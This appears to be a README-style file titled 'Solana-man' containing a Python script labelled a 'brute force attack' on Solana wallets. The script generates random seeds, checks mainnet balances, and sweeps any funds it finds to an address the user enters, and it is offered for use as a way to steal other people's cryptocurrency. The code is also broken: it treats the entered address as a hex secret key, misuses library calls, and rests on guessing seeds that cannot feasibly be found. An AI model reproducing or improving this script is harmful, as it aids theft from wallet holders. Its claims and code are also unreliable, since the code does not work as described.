# Solana-man
It's great 
import os
import time
from solana.rpc.api import Client
from solana.keypair import Keypair
from solana.system_program import transfer_lamports

# Set up Solana RPC client using the Mainnet URL
solana_client = Client("https://api.mainnet-beta.solana.com")

# Function to generate a random seed phrase
def generate_seed_phrase():
    return os.urandom(32).hex()

# Function to check the balance of a Solana wallet
def check_balance(seed_phrase):
    keypair = Keypair.from_seed(bytes.fromhex(seed_phrase))
    public_key = keypair.public_key
    balance = solana_client.get_balance(public_key)
    return balance

# Function to withdraw the total balance to a specified Solana network receive address
def withdraw_balance(seed_phrases, receive_address):
    total_balance = 0
    for seed_phrase in seed_phrases:
        keypair = Keypair.from_seed(bytes.fromhex(seed_phrase))
        public_key = keypair.public_key
        balance = solana_client.get_balance(public_key)
        if balance > 0:
            transfer_lamports(
                solana_client,
                keypair,
                Keypair.from_secret_key(bytes.fromhex(receive_address)),
                balance
            )
            total_balance += balance
    return total_balance

# Function to check if a Solana network receive address has no cryptocurrency in it
def is_address_empty(address):
    balance = solana_client.get_balance(Keypair.from_secret_key(bytes.fromhex(address)).public_key)
    return balance == 0

# Main function to perform the brute force attack
def brute_force_attack():
    seed_phrases = []
    for i in range(800):
        seed_phrase = generate_seed_phrase()
        balance = check_balance(seed_phrase)
        if balance > 0:
            print(f"Found wallet with balance: {balance} SOL")
            print(f"Seed phrase: {seed_phrase}")
            seed_phrases.append(seed_phrase)
    return seed_phrases

# Main program
start_time = time.time()
seed_phrases = brute_force_attack()
print(f"Brute forced {len(seed_phrases)} wallets in {time.time() - start_time:.2f} seconds")

receive_address = input("Enter your Solana network receive address to withdraw funds: ")
if is_address_empty(receive_address):
    total_balance = withdraw_balance(seed_phrases, receive_address)
    print(f"Total balance sent: {total_balance} SOL")
else:
    print("The receive address has cryptocurrency in it. Aborting the withdrawal.")
